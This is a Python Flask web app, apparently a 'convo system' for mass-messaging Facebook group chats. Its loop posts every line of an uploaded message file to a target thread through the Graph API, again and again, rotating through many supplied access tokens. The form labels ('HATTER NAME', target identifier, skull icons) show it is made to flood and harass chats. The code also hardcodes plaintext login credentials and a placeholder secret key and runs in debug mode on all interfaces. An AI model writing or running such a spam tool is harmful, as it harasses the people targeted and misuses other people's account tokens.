from flask import Flask, request, render_template_string, redirect, url_for, session
import requests
from threading import Thread, Event
import time
import random
import string
from functools import wraps
app = Flask(__name__)
app.debug = True
app.secret_key = 'your_secret_key_here'  # Change this to a strong secret key

# Simple user database (in production, use a proper database)
users = {
    'MR AMMAR BADMASH': "MR AMMAR BADMASH",
    'AMMAR': 'ILOVEYOU',
    'LEGEND': 'UMAAH'
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in users and users[username] == password:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('send_message'))
        else:
            return render_template_string('''
            <!DOCTYPE html>
            <html lang="en">
            <head>
              <meta charset="utf-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title> MR AMMAR BADMASH - ACCESS DENIED</title>
              <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
              <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
              <style>
                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
                
                :root {
                  --neon-green: #00FF41;
                  --matrix-green: #00CC33;
                  --dark-bg: #0A0A0A;
                  --card-bg: #001100;
                }
                
                body {
                  background-color: var(--dark-bg);
                  font-family: 'Share Tech Mono', monospace;
                  color: var(--neon-green);
                  overflow-x: hidden;
                  background-image: 
                    linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
                  background-size: 20px 20px;
                  animation: matrix-rain 20s infinite linear;
                }

                @keyframes matrix-rain {
                  0% { background-position: 0 0; }
                  100% { background-position: 20px 20px; }
                }

                .matrix-text {
                  text-shadow: 0 0 5px var(--neon-green), 0 0 10px var(--neon-green), 0 0 15px var(--neon-green);
                }

                .terminal-card {
                  background-color: rgba(0, 20, 0, 0.8);
                  border: 2px solid var(--neon-green);
                  box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
                  backdrop-filter: blur(5px);
                }

                .form-control {
                  background-color: rgba(0, 30, 0, 0.7);
                  border: 1px solid var(--neon-green);
                  color: var(--neon-green);
                  font-family: 'Share Tech Mono', monospace;
                  box-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
                  transition: all 0.3s;
                }

                .form-control:focus {
                  background-color: rgba(0, 40, 0, 0.8);
                  border-color: #00FFFF;
                  box-shadow: 0 0 15px #00FFFF;
                  color: var(--neon-green);
                }

                .btn-primary {
                  background: linear-gradient(45deg, #001100, #003300);
                  border: 2px solid var(--neon-green);
                  color: var(--neon-green);
                  font-family: 'Share Tech Mono', monospace;
                  text-transform: uppercase;
                  letter-spacing: 2px;
                  transition: all 0.3s;
                  box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
                }

                .btn-primary:hover {
                  background: linear-gradient(45deg, #002200, #004400);
                  border-color: #00FFFF;
                  color: #00FFFF;
                  box-shadow: 0 0 25px #00FFFF;
                  transform: translateY(-2px);
                }

                .header-title {
                  text-shadow: 0 0 10px var(--neon-green), 0 0 20px rgba(0, 255, 65, 0.7);
                  animation: text-glow 2s infinite alternate;
                }

                @keyframes text-glow {
                  from { text-shadow: 0 0 10px var(--neon-green), 0 0 20px rgba(0, 255, 65, 0.7); }
                  to { text-shadow: 0 0 15px var(--neon-green), 0 0 30px rgba(0, 255, 65, 0.9), 0 0 40px rgba(0, 255, 65, 0.5); }
                }

                .scan-line {
                  position: fixed;
                  top: 0;
                  left: 0;
                  width: 100%;
                  height: 2px;
                  background: linear-gradient(to right, transparent, var(--neon-green), transparent);
                  animation: scan 3s linear infinite;
                  z-index: 9999;
                }

                @keyframes scan {
                  0% { top: 0%; }
                  100% { top: 100%; }
                }

                label {
                  color: var(--neon-green);
                  text-shadow: 0 0 5px var(--neon-green);
                  font-weight: bold;
                }

                .alert-danger {
                  background-color: rgba(80, 0, 0, 0.8);
                  border: 1px solid #FF003C;
                  color: #FF6666;
                  box-shadow: 0 0 15px rgba(255, 0, 60, 0.5);
                }
              </style>
            </head>
            <body>
              <div class="scan-line"></div>
              
              <div class="container d-flex justify-content-center align-items-center min-vh-100">
                <div class="terminal-card rounded-lg p-4" style="max-width: 400px;">
                  <h2 class="text-center header-title mb-4">
                    <i class="fas fa-terminal"></i> SYSTEM ACCESS
                  </h2>
                  
                  <div class="alert alert-danger text-center">
                    <i class="fas fa-exclamation-triangle"></i> ACCESS DENIED - INVALID CREDENTIALS
                  </div>
                  
                  <form method="post">
                    <div class="mb-3">
                      <label for="username" class="form-label">
                        <i class="fas fa-user"></i> USER IDENTIFIER
                      </label>
                      <input type="text" class="form-control" id="username" name="username" required placeholder="Enter Username">
                    </div>
                    
                    <div class="mb-3">
                      <label for="password" class="form-label">
                        <i class="fas fa-lock"></i> ENCRYPTION KEY
                      </label>
                      <input type="password" class="form-control" id="password" name="password" required placeholder="Enter Password">
                    </div>
                    
                    <button type="submit" class="btn btn-primary w-100 py-2">
                      <i class="fas fa-sign-in-alt"></i> INITIATE SYSTEM ACCESS
                    </button>
                  </form>
                  
                  <div class="mt-3 text-center">
                    <small class="matrix-text">Default Credentials: MR AMMAR BADMASH/matrix123</small>
                  </div>
                </div>
              </div>
            </body>
            </html>
            ''', error="Invalid credentials")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title> MR AMMAR BADMASH - SYSTEM ACCESS</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
      <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        
        :root {
          --neon-green: #00FF41;
          --matrix-green: #00CC33;
          --dark-bg: #0A0A0A;
          --card-bg: #001100;
        }
        
        body {
          background-color: var(--dark-bg);
          font-family: 'Share Tech Mono', monospace;
          color: var(--neon-green);
          overflow-x: hidden;
          background-image: 
            linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
          background-size: 20px 20px;
          animation: matrix-rain 20s infinite linear;
        }

        @keyframes matrix-rain {
          0% { background-position: 0 0; }
          100% { background-position: 20px 20px; }
        }

        .matrix-text {
          text-shadow: 0 0 5px var(--neon-green), 0 0 10px var(--neon-green), 0 0 15px var(--neon-green);
        }

        .terminal-card {
          background-color: rgba(0, 20, 0, 0.8);
          border: 2px solid var(--neon-green);
          box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
          backdrop-filter: blur(5px);
        }

        .form-control {
          background-color: rgba(0, 30, 0, 0.7);
          border: 1px solid var(--neon-green);
          color: var(--neon-green);
          font-family: 'Share Tech Mono', monospace;
          box-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
          transition: all 0.3s;
        }

        .form-control:focus {
          background-color: rgba(0, 40, 0, 0.8);
          border-color: #00FFFF;
          box-shadow: 0 0 15px #00FFFF;
          color: var(--neon-green);
        }

        .btn-primary {
          background: linear-gradient(45deg, #001100, #003300);
          border: 2px solid var(--neon-green);
          color: var(--neon-green);
          font-family: 'Share Tech Mono', monospace;
          text-transform: uppercase;
          letter-spacing: 2px;
          transition: all 0.3s;
          box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
        }

        .btn-primary:hover {
          background: linear-gradient(45deg, #002200, #004400);
          border-color: #00FFFF;
          color: #00FFFF;
          box-shadow: 0 0 25px #00FFFF;
          transform: translateY(-2px);
        }

        .header-title {
          text-shadow: 0 0 10px var(--neon-green), 0 0 20px rgba(0, 255, 65, 0.7);
          animation: text-glow 2s infinite alternate;
        }

        @keyframes text-glow {
          from { text-shadow: 0 0 10px var(--neon-green), 0 0 20px rgba(0, 255, 65, 0.7); }
          to { text-shadow: 0 0 15px var(--neon-green), 0 0 30px rgba(0, 255, 65, 0.9), 0 0 40px rgba(0, 255, 65, 0.5); }
        }

        .scan-line {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 2px;
          background: linear-gradient(to right, transparent, var(--neon-green), transparent);
          animation: scan 3s linear infinite;
          z-index: 9999;
        }

        @keyframes scan {
          0% { top: 0%; }
          100% { top: 100%; }
        }

        label {
          color: var(--neon-green);
          text-shadow: 0 0 5px var(--neon-green);
          font-weight: bold;
        }
      </style>
    </head>
    <body>
      <div class="scan-line"></div>
      
      <div class="container d-flex justify-content-center align-items-center min-vh-100">
        <div class="terminal-card rounded-lg p-4" style="max-width: 400px;">
          <h2 class="text-center header-title mb-4">
            <i class="fas fa-terminal"></i> MR AMMAR BADMASH CONVO SYSTEM 
          </h2>
          <p class="text-center matrix-text">AUTHENTICATION REQUIRED</p>
          
          <form method="post">
            <div class="mb-3">
              <label for="username" class="form-label">
                <i class="fas fa-user"></i> DEVELOPER NAME
              </label>
              <input type="text" class="form-control" id="username" name="username" required placeholder="Enter Username">
            </div>
            
            <div class="mb-3">
              <label for="password" class="form-label">
                <i class="fas fa-lock"></i> PASSWORD 
              </label>
              <input type="password" class="form-control" id="password" name="password" required placeholder="Enter Password">
            </div>
            
            <button type="submit" class="btn btn-primary w-100 py-2">
              <i class="fas fa-sign-in-alt"></i> INITIATE SYSTEM ACCESS
            </button>
          </form>
          
          <div class="mt-3 text-center">
            <small class="matrix-text">Default Credentials: MR AMMAR BADMASH</small>
          </div>
        </div>
      </div>
    </body>
    </html>
    ''')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
@login_required
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title> MR AMMAR BADMASH</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    
    :root {
      --neon-green: #00FF41;
      --matrix-green: #00CC33;
      --dark-bg: #0A0A0A;
      --card-bg: #001100;
    }
    
    body {
      background-color: var(--dark-bg);
      font-family: 'Share Tech Mono', monospace;
      color: var(--neon-green);
      overflow-x: hidden;
      background-image: 
        linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
      background-size: 20px 20px;
      animation: matrix-rain 20s infinite linear;
    }

    @keyframes matrix-rain {
      0% { background-position: 0 0; }
      100% { background-position: 20px 20px; }
    }

    .matrix-text {
      text-shadow: 0 0 5px var(--neon-green), 0 0 10px var(--neon-green), 0 0 15px var(--neon-green);
    }

    .terminal-card {
      background-color: rgba(0, 20, 0, 0.8);
      border: 2px solid var(--neon-green);
      box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
      backdrop-filter: blur(5px);
    }

    .form-control {
      background-color: rgba(0, 30, 0, 0.7);
      border: 1px solid var(--neon-green);
      color: var(--neon-green);
      font-family: 'Share Tech Mono', monospace;
      box-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
      transition: all 0.3s;
    }

    .form-control:focus {
      background-color: rgba(0, 40, 0, 0.8);
      border-color: #00FFFF;
      box-shadow: 0 0 15px #00FFFF;
      color: var(--neon-green);
    }

    .btn-primary {
      background: linear-gradient(45deg, #001100, #003300);
      border: 2px solid var(--neon-green);
      color: var(--neon-green);
      font-family: 'Share Tech Mono', monospace;
      text-transform: uppercase;
      letter-spacing: 2px;
      transition: all 0.3s;
      box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
    }

    .btn-primary:hover {
      background: linear-gradient(45deg, #002200, #004400);
      border-color: #00FFFF;
      color: #00FFFF;
      box-shadow: 0 0 25px #00FFFF;
      transform: translateY(-2px);
    }

    .btn-danger {
      background: linear-gradient(45deg, #330000, #660000);
      border: 2px solid #FF003C;
      color: #FFF;
      font-family: 'Share Tech Mono', monospace;
      text-transform: uppercase;
      letter-spacing: 2px;
      transition: all 0.3s;
      box-shadow: 0 0 15px rgba(255, 0, 60, 0.5);
    }

    .btn-danger:hover {
      background: linear-gradient(45deg, #660000, #990000);
      border-color: #FF6666;
      box-shadow: 0 0 25px #FF003C;
      transform: translateY(-2px);
    }

    .btn-warning {
      background: linear-gradient(45deg, #333300, #666600);
      border: 2px solid #FFFF00;
      color: #FFF;
      font-family: 'Share Tech Mono', monospace;
      text-transform: uppercase;
      letter-spacing: 2px;
      transition: all 0.3s;
      box-shadow: 0 0 15px rgba(255, 255, 0, 0.5);
    }

    .btn-warning:hover {
      background: linear-gradient(45deg, #666600, #999900);
      border-color: #FFFF66;
      box-shadow: 0 0 25px #FFFF00;
      transform: translateY(-2px);
    }

    .header-title {
      text-shadow: 0 0 10px var(--neon-green), 0 0 20px rgba(0, 255, 65, 0.7);
      animation: text-glow 2s infinite alternate;
    }

    @keyframes text-glow {
      from { text-shadow: 0 0 10px var(--neon-green), 0 0 20px rgba(0, 255, 65, 0.7); }
      to { text-shadow: 0 0 15px var(--neon-green), 0 0 30px rgba(0, 255, 65, 0.9), 0 0 40px rgba(0, 255, 65, 0.5); }
    }

    .scan-line {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 2px;
      background: linear-gradient(to right, transparent, var(--neon-green), transparent);
      animation: scan 3s linear infinite;
      z-index: 9999;
    }

    @keyframes scan {
      0% { top: 0%; }
      100% { top: 100%; }
    }

    .binary-rain {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      opacity: 0.1;
      z-index: -1;
    }

    .binary-text {
      color: var(--neon-green);
      font-size: 12px;
      white-space: nowrap;
      animation: binary-fall linear infinite;
      position: absolute;
    }

    @keyframes binary-fall {
      0% { transform: translateY(-100px); }
      100% { transform: translateY(100vh); }
    }

    label {
      color: var(--neon-green);
      text-shadow: 0 0 5px var(--neon-green);
      font-weight: bold;
    }

    .footer {
      border-top: 1px solid var(--matrix-green);
      padding-top: 20px;
      margin-top: 30px;
    }

    .whatsapp-link {
      color: #25d366 !important;
      text-shadow: 0 0 5px #25d366;
      text-decoration: none;
    }

    .whatsapp-link:hover {
      color: #00FF41 !important;
      text-shadow: 0 0 10px #25d366;
    }

    .social-link {
      color: var(--neon-green);
      text-decoration: none;
      transition: all 0.3s;
    }

    .social-link:hover {
      color: #00FFFF;
      text-shadow: 0 0 10px #00FFFF;
    }

    .user-info {
      position: absolute;
      top: 20px;
      right: 20px;
      background: rgba(0, 30, 0, 0.8);
      padding: 10px 15px;
      border: 1px solid var(--neon-green);
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
    }
  </style>
</head>
<body>
  <div class="scan-line"></div>
  <div class="binary-rain" id="binaryRain"></div>

  <div class="user-info">
    <i class="fas fa-user-shield"></i> USER: {{ session.username }} 
    <a href="/logout" class="btn btn-warning btn-sm ms-2"><i class="fas fa-power-off"></i></a>
  </div>

  <header class="header mt-4">
    <h1 class="mt-3 header-title">
      <i class="fas fa-terminal"></i> DARK MR AMMAR BADMASH
    </h1>
    <p class="matrix-text">THE POWERFULL DEVELOPING MR AMMAR BADMASH SYSTEM</p>
  </header>

  <div class="container terminal-card rounded-lg p-4" style="max-width: 400px;">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">
          <i class="fas fa-key"></i> SELECT TOKEN PROTOCOL
        </label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">SINGLE TOKEN</option>
          <option value="multiple">TOKEN DATABASE</option>
        </select>
      </div>

      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">
          <i class="fas fa-user-secret"></i> ENCRYPTED TOKEN
        </label>
        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Enter Authorization Token">
      </div>

      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">
          <i class="fas fa-database"></i> TOKEN DATABASE FILE
        </label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>

      <div class="mb-3">
        <label for="threadId" class="form-label">
          <i class="fas fa-bullseye"></i> GROUP CONVO ID
        </label>
        <input type="text" class="form-control" id="threadId" name="threadId" required placeholder="Enter Target Identifier">
      </div>

      <div class="mb-3">
        <label for="kidx" class="form-label">
          <i class="fas fa-skull"></i> HATTER NAME
        </label>
        <input type="text" class="form-control" id="kidx" name="kidx" required placeholder="Enter Operative Identity">
      </div>

      <div class="mb-3">
        <label for="time" class="form-label">
          <i class="fas fa-clock"></i> TIME INTERVAL (SECONDS)
        </label>
        <input type="number" class="form-control" id="time" name="time" required value="2">
      </div>

      <div class="mb-3">
        <label for="txtFile" class="form-label">
          <i class="fas fa-file-code"></i> PAYLOAD MESSAGE DATABASE
        </label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>

      <button type="submit" class="btn btn-primary btn-submit w-100 py-2">
        <i class="fas fa-rocket"></i> INITIATE DEPLOYMENT
      </button>
    </form>

    <form method="post" action="/stop" class="mt-4">
      <div class="mb-3">
        <label for="taskId" class="form-label">
          <i class="fas fa-stop-circle"></i> TERMINATION SEQUENCE
        </label>
        <input type="text" class="form-control" id="taskId" name="taskId" required placeholder="Enter Mission ID to Terminate">
      </div>
      <button type="submit" class="btn btn-danger btn-submit w-100 py-2">
        <i class="fas fa-skull-crossbones"></i> ABORT MISSION
      </button>
    </form>
  </div>

  <footer class="footer text-center mt-4">
    <p class="matrix-text">© 2026MR AMMAR LEGEND CONVO SYSTEM</p>
    <p>
      <a href="https://www.facebook.com/share/1EhWN5UY1N/" class="social-link">
        <i class="fab fa-facebook"></i> SECURE CHANNEL
      </a>
    </p>
    <div class="mb-3">
      <a href="https://wa.me/+994406776859" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> ENCRYPTED COMMUNICATION
      </a>
    </div>
  </footer>

  <script>
    function createBinaryRain() {
      const binaryRain = document.getElementById('binaryRain');
      const chars = '01010101010101010101010101010101';
      
      for (let i = 0; i < 30; i++) {
        const binaryElement = document.createElement('div');
        binaryElement.className = 'binary-text';
        binaryElement.style.left = Math.random() * 100 + 'vw';
        binaryElement.style.animationDuration = (Math.random() * 10 + 5) + 's';
        binaryElement.style.animationDelay = Math.random() * 5 + 's';
        binaryElement.textContent = chars;
        binaryRain.appendChild(binaryElement);
      }
    }

    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }

    // Initialize binary rain
    createBinaryRain();
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
@login_required
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5331)
